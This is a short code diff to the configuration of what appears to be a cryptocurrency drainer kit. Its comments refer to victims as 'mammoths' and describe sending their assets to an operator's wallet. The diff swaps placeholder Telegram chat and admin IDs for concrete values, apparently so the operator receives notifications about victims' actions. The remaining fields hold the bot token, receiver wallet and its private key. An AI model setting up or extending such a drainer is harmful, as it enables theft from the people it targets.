@@ -22,9 +22,9 @@ const MS_Encryption_Key = 50; // Please specify any number to be used for encryp
 // The same number should also be specified in the web3-provider.js file - if they differ, nothing will work correctly
 
 const MS_Telegram_Token = "BOT_TOKEN"; // Enter your bot token from @BotFather here (go there, create a bot, and get this token)
-const MS_Telegram_Chat_ID = ["CHAT_ID"]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
+const MS_Telegram_Chat_ID = [1003741658650]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
 // To specify multiple chats, fill it out like this: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
-const MS_Telegram_Admin_IDs = [ 1234567890 ]; // Enter your Telegram ID here so that it only accepts commands from you
+const MS_Telegram_Admin_IDs = [1087968824 ]; // Enter your Telegram ID here so that it only accepts commands from you
 
 const MS_Wallet_Address = "INSERT_RECEIVER_HERE"; // Wallet address where the assets will be sent
 const MS_Wallet_Private = "WALLET_PRIVATE_HERE"; // Private key for the above wallet, SPECIFYING IS MANDATORY, OTHERWISE WITHDRAWAL WILL NOT WORK
